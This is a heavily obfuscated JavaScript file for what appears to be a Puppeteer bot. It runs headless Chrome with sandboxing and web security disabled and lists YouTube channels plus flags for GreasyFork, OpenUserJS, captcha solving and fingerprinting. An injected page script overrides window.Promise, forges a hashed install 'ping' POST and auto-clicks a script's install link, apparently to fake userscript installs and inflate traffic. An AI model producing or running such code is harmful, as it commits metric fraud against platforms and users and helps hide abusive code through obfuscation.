                K = Q[J - (0x5 * -0x5ad + 0x222a * -0x1 + 0x1d7 * 0x22)] ^ Q[J - (-0x107e + -0x1fae * -0x1 + -0xf28)] ^ Q[J - (-0x21a1 * 0x1 + -0x1d06 + -0x3eb5 * -0x1)] ^ Q[J - (0x529 + -0xbcd + 0x6b4)], Q[J] = K << -0x4 * 0x907 + 0x83c + 0x1be1 | K >>> -0x22d1 + -0x17 * 0x31 + 0x2757;
              for (J = 0x7 * 0x3b + -0x19f4 + 0x1857; J < -0x26f * 0xb + 0x43 * 0x17 + 0x14d4; J += -0x1247 * 0x2 + 0x1407 + 0x3 * 0x584)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xd1e + 0x1 * -0x25d0 + 0x18b7 | L >>> -0x23fc + -0x1d43 + -0x689 * -0xa) + (M & N | ~M & O) + P + (-0x1 * -0x4c251cb + -0x3 * -0x10c53166 + -0x1e * -0x12e6b52) + Q[J] << 0xe4b * -0x2 + 0x1 * -0x2433 + 0x40c9) << 0xa78 + 0x1596 * -0x1 + 0x1 * 0xb23 | P >>> 0x625 + -0x188b + 0x62b * 0x3) + (L & (M = M << -0x3d * 0x12 + -0x937 * -0x1 + 0x4cf * -0x1 | M >>> -0x124f + 0x6 * 0x1f8 + 0x681) | ~L & N) + O + (0x5f2e7 * 0x824 + -0xa966d697 + 0xd37befb4) + Q[J + (-0xfc + -0x228c + -0x2389 * -0x1)] << -0x2f * -0xb8 + 0x166d * -0x1 + -0xb5b) << 0xa71 + 0x2060 + 0x1f2 * -0x16 | O >>> -0x2 * 0xf5e + -0x146f + 0x3346) + (P & (L = L << -0x1fb8 + -0x70 * -0x46 + -0x3e * -0x5 | L >>> 0x683 * -0x1 + 0x368 * 0x1 + 0x31d) | ~P & M) + N + (0x4ab * -0x13faa4 + 0x35af273 * 0x18 + 0x673eba5d) + Q[J + (-0x1f3c + -0xf4 + 0x2032 * 0x1)] << -0x1b6b + 0x16f5 + 0x1 * 0x476) << -0xe7c + -0x1d9a + -0x64d * -0x7 | N >>> 0x1a7b * 0x1 + -0x159 * -0x3 + -0x1 * 0x1e6b) + (O & (P = P << 0x23 * -0xc4 + 0x17 * 0xfb + 0x45d * 0x1 | P >>> 0x3a0 * -0x2 + -0x98 * -0x2 + 0x612) | ~O & L) + M + (0x26c * -0x20df7 + 0x67 * -0x90ff9a + 0x99d322c3) + Q[J + (-0x4a * -0x3b + 0x1 * -0x943 + -0x7c8)] << 0x5 * -0x69b + -0x1cec + 0x1 * 0x3df3) << -0x13 * 0x13b + 0x1 * -0x21ba + 0x3920 | M >>> 0x1165 + 0x3 * -0x12f + -0xdbd) + (N & (O = O << -0x1a3f + -0x5 * -0x22d + 0xf7c | O >>> -0x10 * 0x1d2 + -0x2421 + 0x4143) | ~N & P) + L + (0x8733 * 0xed3e + -0x5715b * 0x983 + 0x5 * 0x365be90) + Q[J + (-0x1b4e + -0xe8 * 0x2 + 0x3 * 0x9b6)] << 0x214d + 0x7 * -0x22f + -0x1204, N = N << -0x78d * -0x5 + -0x1 * -0xc7 + 0x2 * -0x1335 | N >>> 0x1c4f * -0x1 + 0x13ba + 0x897;
              for (; J < 0xc31 + 0x1b9b + -0x27a4; J += 0x254d + -0x1faf * 0x1 + 0x1 * -0x599)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x48 + 0x19c9 + -0x1a0c * 0x1 | L >>> -0x1be3 + -0x19f6 * 0x1 + 0x2 * 0x1afa) + (M ^ N ^ O) + P + (0x18a9713 * -0x63 + 0x8ad28b4f + 0x7c9fccab) + Q[J] << 0x2 * -0x130b + -0x4f * 0x2 + 0x26b4) << -0x7 * -0x426 + -0xd6e * -0x1 + -0x2a73 | P >>> 0x1 * 0x2145 + 0x205d + -0x4187) + (L ^ (M = M << 0x35f * 0xb + 0x38b * -0x1 + -0x216c | M >>> -0x97 * -0x2b + 0x1b75 + -0x34d0) ^ N) + O + (-0x3a * -0x1adc8a5 + 0x1 * -0x482eedb1 + 0x9142 * 0x96f8) + Q[J + (-0x844 * 0x4 + 0x326 + 0x1deb)] << 0xd * -0x2df + 0x206 + -0x50b * -0x7) << 0x1e7b + 0x24ce + 0x11f * -0x3c | O >>> 0x1fb5 + 0x20 * -0x7a + -0x105a) + (P ^ (L = L << -0x7 * -0x19 + -0x1 * -0x15e8 + -0x1 * 0x1679 | L >>> -0x1b52 + 0x357 * 0x7 + 0x1 * 0x3f3) ^ M) + N + (-0xd38c13fa + 0x7acd2 * 0xa06 + 0x35 * 0x4a1a7d3) + Q[J + (-0x834 + -0x11b + -0x3 * -0x31b)] << -0x2192 * 0x1 + 0x749 * 0x5 + -0x2db) << 0xbe9 * -0x1 + 0x174c + -0x3 * 0x3ca | N >>> 0x445 * -0x7 + 0x3 * -0xbd9 + -0x4189 * -0x1) + (O ^ (P = P << -0x51b * -0x3 + -0x2e6 + 0x43 * -0x2f | P >>> 0x136b + -0x11c9 + -0x1a0) ^ L) + M + (0x8396cbbd + 0xb4cfda01 + 0xc98cba1d * -0x1) + Q[J + (-0x709 * -0x5 + 0x2 * 0x4dc + -0x1671 * 0x2)] << -0x88f + -0xdc0 + -0x164f * -0x1) << 0x10bb * 0x2 + -0x88 * 0x4 + -0x1f51 | M >>> -0x1 * 0xb1d + 0x47f * 0x1 + 0x6b9) + (N ^ (O = O << 0x200e + 0x1e41 + 0x6e9 * -0x9 | O >>> 0x23f + -0x4b9 + -0xd4 * -0x3) ^ P) + L + (0x1 * -0x6e90ac2 + -0x13 * -0xa06cdb1 + -0x48be4dc0) + Q[J + (-0x5 * -0x1d4 + -0x4 * -0x58c + -0x1f50)] << -0x2377 * 0x1 + 0x6a * -0x4a + 0x1609 * 0x3, N = N << -0x11 * 0xfb + -0x16 * 0x89 + -0x1 * -0x1c8f | N >>> -0x4f3 + 0x1db4 + -0x7 * 0x389;
              for (; J < -0x583 + 0xf84 + 0x29 * -0x3d; J += 0x1aa + -0x6e4 + 0x53f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x16f5 * -0x1 + -0xfd + 0x17f7 | L >>> 0x202 * 0x13 + 0x20 * 0xf1 + -0x442b) + (M & N | M & O | N & O) + P - (0x646d7b6 * 0xd + -0x157 * 0x1feeae + 0x4a141a08) + Q[J] << -0x796 * -0x5 + 0x572 * 0x6 + -0x469a) << 0xf3b + -0x3b7 * -0x4 + -0x1e12 | P >>> -0x2 * 0x89f + -0x1 * 0x24fa + 0x3653) + (L & (M = M << -0x1252 + 0xd * -0x19d + -0x3b * -0xab | M >>> 0x145f + 0xaef + -0x1f4c) | L & N | M & N) + O - (0x5b855e2a + 0xe0ef418a + -0xcb905c90) + Q[J + (-0x130d + -0x9 * 0x3fd + 0x3 * 0x1251)] << -0x717 + -0x1c9 + 0x8e0) << -0xc4c * 0x2 + -0x1117 + 0x22 * 0x13a | O >>> 0x15 * -0x57 + 0x1 * -0x243d + -0x2b7b * -0x1) + (P & (L = L << -0x1bc4 + 0x56a + -0x2cf * -0x8 | L >>> 0x305 + -0x716 * -0x2 + 0x53 * -0x35) | P & M | L & M) + N - (-0x2 * 0x424ec8d4 + 0x31e576a1 + -0x4bfd09 * -0x293) + Q[J + (0x12aa * 0x1 + 0x343 + -0x15eb)] << -0x1 * 0x913 + 0x1 * 0x16f5 + 0x6f1 * -0x2) << -0x24bb + -0x127 + 0x25e7 | N >>> 0x6ab + 0xfce + -0x7 * 0x332) + (O & (P = P << 0x1895 * 0x1 + -0x1 * 0x23ad + 0xb36 | P >>> -0x1 * -0x2497 + -0x1 * -0x103f + -0x3 * 0x119c) | O & L | P & L) + M - (0x6d263547 + 0xb6ff2ccc + 0xb3411eef * -0x1) + Q[J + (-0x1bd1 + 0x2 * -0x975 + 0x1 * 0x2ebe)] << -0xa24 + -0x221e * 0x1 + 0x2c42) << 0x1a05 * -0x1 + -0x4 * 0x522 + 0x2e92 | M >>> -0x2bb * -0x1 + 0xee + -0x38e) + (N & (O = O << 0xa5 * -0x11 + -0x73 * -0x4e + -0x7fd * 0x3 | O >>> 0x5 * 0x472 + 0x1 * -0x57a + -0x85f * 0x2) | N & P | O & P) + L - (-0x2 * -0x13c4901e + -0x20fb4c9 * -0x23 + 0x1356b6d) + Q[J + (0x2603 + -0x270b * 0x1 + 0x10c)] << -0x20cd + 0xf8d + 0x17 * 0xc0, N = N << 0x3 * -0xa12 + -0x13 * 0x207 + 0x44d9 | N >>> -0x1 * -0x245 + 0x1fb4 + -0x21f7;
              for (; J < -0x13 * 0x95 + -0x21db + -0x2 * -0x169d; J += 0xbee * 0x1 + -0x8d9 + 0x10 * -0x31)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1999 * 0x1 + 0xb33 + -0x1 * -0xe6b | L >>> 0x10eb + 0x8 * 0x88 + 0x544 * -0x4) + (M ^ N ^ O) + P - (-0x3af1a6db + -0x1 * -0x50c01e9f + 0x1fcec666) + Q[J] << -0x540 * -0x7 + -0x1cfb + -0x7c5) << -0x1993 * 0x1 + 0x1d5c + -0x3c4 | P >>> 0x2423 + 0x1240 + -0x243 * 0x18) + (L ^ (M = M << -0xa6f * 0x1 + -0x2e9 * 0xd + 0x3062 | M >>> -0x3b * 0x52 + -0x1 * 0x1c30 + 0x2f18) ^ N) + O - (0xd * -0x76fe3a1 + 0x86bc3cf * -0x1 + -0x4f5bc893 * -0x2) + Q[J + (-0x751 * -0x3 + -0xb8d * -0x2 + -0x2d0c)] << 0x26c6 + -0x124d + -0x1479) << -0x2305 + 0x1 * -0x347 + 0x2651 | O >>> -0x955 * -0x1 + -0x5 * 0x15f + -0x25f) + (P ^ (L = L << -0x1bb3 * 0x1 + -0x180f + 0x33e * 0x10 | L >>> -0x1 * 0x2203 + 0x8b * -0x2f + 0x3b8a) ^ M) + N - (-0x400ddd68 + -0x5f5c4a12 + -0x135dc36c * -0xb) + Q[J + (-0x1bf4 + -0xd5e + 0x2954)] << 0x218 * -0xe + 0x1c61 + 0xef * 0x1) << 0xea6 + 0x204c + -0x2eed | N >>> 0x1153 + -0x4f * 0x40 + 0x288) + (O ^ (P = P << -0xdb7 * 0x1 + 0x18 * 0x6d + -0x39d * -0x1 | P >>> -0x415 + -0x2 * -0x775 + -0x11 * 0xa3) ^ L) + M - (-0x4c52354 + -0x3a3e7943 + 0x46b2d * 0x1a65) + Q[J + (-0x26d9 + 0x112b + 0x3 * 0x73b)] << 0x1556 + 0x4 * -0x88f + -0xd * -0xfe) << 0xf2 * 0xe + -0x1fb4 + 0x127d | M >>> -0x9 * 0x349 + -0xde2 + 0x2b8e) + (N ^ (O = O << -0xd * 0x26d + 0x2 * -0xa3d + 0x5 * 0xa6d | O >>> 0x33b + 0xd4 * -0x18 + -0x1 * -0x10a7) ^ P) + L - (-0x25cde6e0 + -0x2496697b * -0x1 + -0x1 * -0x36d4bb8f) + Q[J + (0x104e + -0xf8 * -0x23 + -0x3232)] << 0x18d1 * 0x1 + 0xa * -0x29 + -0x1 * 0x1737, N = N << -0x181 + 0x12ed + 0xa * -0x1bb | N >>> 0x22a1 + 0x10 * -0x1b3 + -0x76f;
              this['h0'] = this['h0'] + L << -0x1baa + -0x1e72 + -0xe87 * -0x4, this['h1'] = this['h1'] + M << 0x3d * 0x23 + 0x9eb * -0x3 + -0xab5 * -0x2, this['h2'] = this['h2'] + N << 0x25e5 + 0x22e1 * 0x1 + -0x48c6, this['h3'] = this['h3'] + O << 0x1f7e * 0x1 + 0x13 * -0xaf + -0x1281, this['h4'] = this['h4'] + P << 0x2547 * 0x1 + -0x1 * 0x162d + -0xf1a;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2131 + 0x1 * 0xed5 + 0x1278 & 0x1d5d + -0xf59 + -0x9 * 0x18d] + w[J >> 0x1da5 + 0xa93 + -0x2820 & -0xb * -0xf7 + 0x81c + 0x12aa * -0x1] + w[J >> 0x56e + 0x1 * 0xb4d + -0x10a7 & 0x67 * -0x11 + 0xf * -0x222 + -0x26 * -0x106] + w[J >> 0x1 * 0x155f + -0x1bd8 + 0x7 * 0xef & 0x1 * -0xdd4 + 0x157a + 0x43 * -0x1d] + w[J >> -0x99e + -0xd * -0x269 + -0x81 * 0x2b & -0x1 * -0xe37 + 0x2 * -0x1b2 + 0xd * -0xd4] + w[J >> 0x588 * -0x1 + -0x1e13 + 0x23a3 & 0x8a5 * -0x2 + 0x1e * 0x139 + 0x1 * -0x1355] + w[J >> 0xc73 * -0x1 + 0x1f06 + -0x128f & -0x8b0 + 0xddb * 0x1 + -0x1 * 0x51c] + w[-0x1345 + 0x18 * 0xd0 + -0x2c & J] + w[K >> -0x1bd9 * -0x1 + 0x26af * 0x1 + -0x2 * 0x2136 & 0x1 * 0x102a + -0x103d * 0x1 + 0x22] + w[K >> -0x2 * 0x1362 + 0x1a13 + 0x443 * 0x3 & -0x946 * -0x1 + -0x3b * 0x2f + 0x17 * 0x12] + w[K >> -0x2422 + -0x36 * -0x71 + 0xc60 & -0x6 * 0x401 + -0xa * 0x232 + 0x2e09] + w[K >> 0xfd0 + -0x1445 + 0x485 & 0xece + 0x1271 + 0x1098 * -0x2] + w[K >> 0x1 * 0x72e + 0x109c + 0x3f5 * -0x6 & -0x20cf + -0x2b1 + -0x238f * -0x1] + w[K >> -0x1 * -0x21e9 + -0x1802 + -0x9df & -0xc03 + -0x1fc7 + 0x2bd9] + w[K >> -0x68e + -0x1fa + -0x223 * -0x4 & 0x1a * -0xe9 + -0x1 * 0xba5 + -0x9 * -0x3ee] + w[0x209 + -0x218f + 0x1f95 & K] + w[L >> -0x20e6 + 0xaa + 0x2058 & -0x19e5 + 0x146 * -0x16 + 0x35f8] + w[L >> -0x14e8 + -0x1813 * -0x1 + -0x313 & 0x2326 + -0x2a * 0xcd + 0x1 * -0x175] + w[L >> -0xb30 + -0x1f6 * 0x2 + 0xf30 & 0xcf1 + -0x1 * 0x1b37 + 0x1 * 0xe55] + w[L >> 0x15e8 + 0x138c + -0x2964 & 0x4 * -0x8fa + 0x1 * -0x482 + 0x2879 * 0x1] + w[L >> 0x117d + 0x1010 + -0x2181 & -0x26e9 + 0x116e + 0x158a * 0x1] + w[L >> -0x1 * -0x1066 + 0x1f8d + 0x105 * -0x2f & 0x2a3 + -0x14 * 0x1bb + 0x2008] + w[L >> 0x181 * -0x6 + 0x1 * -0xc41 + 0x154b & -0x11 * -0x21d + 0x17 * -0x5e + 0xd * -0x21c] + w[-0x1fff + 0x219a + -0x18c & L] + w[M >> 0x1d41 + -0x2 * -0x7f4 + -0x13 * 0x25f & 0x11fb + -0x1a11 + -0x1a1 * -0x5] + w[M >> 0x11d8 + -0x2614 + -0x1454 * -0x1 & 0x10ab * -0x1 + -0x1 * 0x1d3 + -0x62f * -0x3] + w[M >> 0x1458 + 0x8f2 + 0x1 * -0x1d36 & 0x1ff9 + 0xd4 * -0x3 + -0x1d6e] + w[M >> -0x1100 + -0x8e8 + 0x19f8 & 0x1 * 0x5c6 + -0x305 * -0xb + -0x26ee] + w[M >> 0x1be3 + -0x1939 + 0x86 * -0x5 & -0x138e + 0x7 * 0x283 + -0x4 * -0x82] + w[M >> 0x3e * -0xd + -0x16fc + 0x1a2a & -0x23be + -0x477 + 0x2844] + w[M >> -0x20bd + 0x71 * -0x4a + -0x416b * -0x1 & 0xf60 + -0x14e2 + -0x11d * -0x5] + w[-0x335 + 0x9fb + -0x1 * 0x6b7 & M] + w[N >> 0x2280 + -0x1 * -0x1fd2 + -0x4236 & 0x2 * 0xde7 + -0x10 * -0x141 + -0x1 * 0x2fcf] + w[N >> -0x2309 + 0x6e * -0x11 + -0x9 * -0x4b7 & 0x792 + 0x532 + 0xcb5 * -0x1] + w[N >> -0x6e9 * 0x1 + 0x1c00 + -0x1e9 * 0xb & -0x18f + 0x102c + -0x51 * 0x2e] + w[N >> 0x1291 * 0x2 + -0x112e + -0x13 * 0x10c & 0x1 * -0x1399 + -0x31c + -0x1f * -0xbc] + w[N >> 0x9d4 + -0x77d * -0x5 + -0x2f39 & -0x1e6d * -0x1 + -0xdfd * 0x2 + -0x264] + w[N >> 0x260e * 0x1 + -0x1b41 * 0x1 + -0xac5 & 0x5 * 0x3a1 + -0x2494 + 0x127e] + w[N >> 0x10e + 0x121c + 0x6 * -0x331 & -0x1 * -0x220c + 0x1 * -0x1001 + -0x11fc] + w[-0x183c + 0xe90 + -0x9bb * -0x1 & N];
            }
            [V(0x3)]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xce5 * -0x1 + -0x1045 + 0x1d42 * 0x1 & 0xaed + -0x2610 + 0x1a * 0x115,
                J >> 0x383 + -0xe00 + -0x49 * -0x25 & -0xa9 * 0x35 + -0x5b0 * 0x1 + 0x1c * 0x17d,
                J >> 0x10c + 0x1c1 * -0x5 + 0x5 * 0x18d & -0x2620 + -0xe33 + -0x145 * -0x2a,
                -0xb27 + 0x625 + 0x601 & J,
                K >> -0x529 * 0x1 + -0x7ef * -0x1 + -0x1 * 0x2ae & 0x2 * -0x10a + -0x107f * -0x2 + -0x1deb,
                K >> -0x423 + 0x11c2 + -0xd8f & 0x1545 + -0x2305 + -0x1 * -0xebf,
                K >> 0x2312 + -0x1 * -0x5bb + -0x28c5 & -0x98a + 0x3 * 0x10c + 0x3 * 0x277,
                -0x1 * 0x115f + 0x2189 * 0x1 + -0xf2b & K,
                L >> 0xe39 + -0x1 * -0x19b3 + -0x27d4 & 0x217d + -0x15 * 0x8b + -0x1517,
                L >> -0x35 * 0x21 + -0x4 * 0x8b5 + 0x29b9 & 0x15 * -0x89 + -0x1b12 + 0x75 * 0x56,
                L >> -0x4f9 * -0x6 + 0x1c3f + -0x3a0d & 0x1 * -0x20c + 0x324 + -0x19,
                -0x11a4 + 0x1 * 0xda0 + 0x503 & L,
                M >> 0x9db + 0x21e + 0xbe1 * -0x1 & 0x3 * 0x648 + -0x1680 + 0x4a7 * 0x1,
                M >> 0x19da + 0xb04 + -0x24ce & 0x1 * 0x1727 + 0x87d + -0x1ea5,
                M >> 0x120d * -0x2 + -0x10a8 + -0x1a65 * -0x2 & 0x20f2 + 0x1 * -0x177e + -0x875,
                -0x1236 + 0x105a + -0x2db * -0x1 & M,
                N >> 0x6f * 0x52 + 0x1319 + -0x368f & 0x5d3 + 0x4c * 0x7c + 0x29a4 * -0x1,
                N >> -0x1766 + -0x1 * -0x3a1 + 0x13d5 & -0x4 * 0x22 + 0xf5f + 0xdd8 * -0x1,
                N >> -0x1139 + -0x1ba9 + 0x1675 * 0x2 & -0x2184 + -0x1aa0 + 0x3d23,
                -0x22f * -0x2 + -0x1eb * -0x1 + 0x2a5 * -0x2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * 0x332 + -0x813 * -0x3 + -0x1 * 0x14f3), (K = new DataView(J))['setUint32'](-0x163a + 0x1 * 0x23c6 + -0xd8c, this['h0']), K['setUint32'](-0x1 * 0x1b1 + -0x2440 + -0xed * -0x29, this['h1']), K['setUint32'](-0x463 * 0x1 + 0x1c93 + 0x2 * -0xc14, this['h2']), K['setUint32'](0xf06 + -0x105b + 0x1 * 0x161, this['h3']), K['setUint32'](-0x2e * -0x95 + 0xd68 + -0x2 * 0x140f, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x74a + 0x2257 + -0x1b0d];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x260d + -0x2 * -0x5ab + -0x3163;
            J[0x1307 * -0x1 + 0x2 * 0x8cd + -0x16d * -0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x21ba + 0x1524 + 0xc96] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1550 + -0x670 + 0x1bc1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2 * -0x14d + -0xbc7 + -0x1d6 * -0x5;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x47 * 0x7c + 0x61 * 0x55 + 0x80b), Promise['resolve'](-0x151f * 0x1 + 0x1 * 0xe02 + 0x71e);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x2262 + -0x2 * -0x423 + -0x2aa8; j < -0x601 * 0x4 + -0xbe9 + 0x23ee; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * 0x38f3 + 0x193e * 0x1 + -0x747 * 0x7 + (-0x824 + -0x282 + -0x7 * -0x332) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x26c5 + -0xef * 0x24 + 0x2 * -0x293) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + W(0x4),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + X(0x1a, 'I(**') + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * 0x24b5 + 0x1bad + -0x52 * 0xc9; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2 * 0x10a3 + 0x11d1 * 0x1 + 0xb * -0x4a5);
    let h = e[f];
    if (c['DteiMp'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x184d + 0x4f6 + 0x1 * 0x1357, r, s, t = 0x204f * -0x1 + -0x1a * -0xb9 + 0xd85; s = m['charAt'](t++); ~s && (r = q % (-0xc2e * 0x2 + -0xe9 * 0xb + -0x2263 * -0x1) ? r * (0x9b6 + 0x1 * -0x1114 + 0x79e) + s : s, q++ % (-0x2191 * -0x1 + 0x1f2f + 0x3 * -0x1594)) ? o += String['fromCharCode'](-0xede + -0xe * -0x271 + -0x1251 & r >> (-(-0x1726 + 0x4 * 0x4b + 0x15fc) * q & -0x6e1 + 0x6 * -0x319 + 0x9 * 0x2d5)) : 0xf29 + -0x11 * 0x223 + 0x152a) {
          s = n['indexOf'](s);
        }
        for (let u = 0xab6 + 0x25 * 0x3b + -0x133d, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1f * -0x123 + -0x14e * -0x1c + -0x13b))['slice'](-(-0x48 + 0x5 * -0x3a6 + 0x1288));
        }
        return decodeURIComponent(p);
      };
      c['ZZOZnP'] = i, b = arguments, c['DteiMp'] = !![];
    }
    const j = e[0x1 * 0x58b + -0x26c2 + 0x2137],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ZZOZnP'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2 * 0x10a3 + 0x11d1 * 0x1 + 0xb * -0x4a5);
    let h = e[f];
    if (b['xlZwvC'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x184d + 0x4f6 + 0x1 * 0x1357, s, t, u = 0x204f * -0x1 + -0x1a * -0xb9 + 0xd85; t = n['charAt'](u++); ~t && (s = r % (-0xc2e * 0x2 + -0xe9 * 0xb + -0x2263 * -0x1) ? s * (0x9b6 + 0x1 * -0x1114 + 0x79e) + t : t, r++ % (-0x2191 * -0x1 + 0x1f2f + 0x3 * -0x1594)) ? p += String['fromCharCode'](-0xede + -0xe * -0x271 + -0x1251 & s >> (-(-0x1726 + 0x4 * 0x4b + 0x15fc) * r & -0x6e1 + 0x6 * -0x319 + 0x9 * 0x2d5)) : 0xf29 + -0x11 * 0x223 + 0x152a) {
          t = o['indexOf'](t);
        }
        for (let v = 0xab6 + 0x25 * 0x3b + -0x133d, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1f * -0x123 + -0x14e * -0x1c + -0x13b))['slice'](-(-0x48 + 0x5 * -0x3a6 + 0x1288));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * 0x58b + -0x26c2 + 0x2137,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x4 * 0x6ee + 0x462 * -0x8 + 0x758; u < 0x798 + 0x1f07 + -0x1 * 0x259f; u++) {
          p[u] = u;
        }
        for (u = -0x264d + -0x1f6a + 0x45b7; u < -0xb5 * 0x27 + 0x2648 + 0x1f1 * -0x5; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x7 * -0x589 + -0x2543 + 0x3e * -0x2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xef4 + 0x739 * -0x5 + 0x1529 * 0x1, q = 0x32 + 0x1a2d + -0x1a5f * 0x1;
        for (let v = -0x147a + 0xc07 + -0x2d1 * -0x3; v < n['length']; v++) {
          u = (u + (0x44b + -0x1 * 0x491 + -0x1 * -0x47)) % (-0x1bad * 0x1 + 0x1 * -0xebc + 0x2b69 * 0x1), q = (q + p[u]) % (0xac * 0x11 + -0xeef * -0x1 + -0x195b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1d74 + -0x1027 + -0xc4d)]);
        }
        return t;
      };
      b['gMYQnj'] = m, c = arguments, b['xlZwvC'] = !![];
    }
    const j = e[0x619 + -0x27 * 0xf7 + 0x3f1 * 0x8],
      k = f + j,
      l = c[k];
    return !l ? (b['EIojuA'] === undefined && (b['EIojuA'] = !![]), h = b['gMYQnj'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
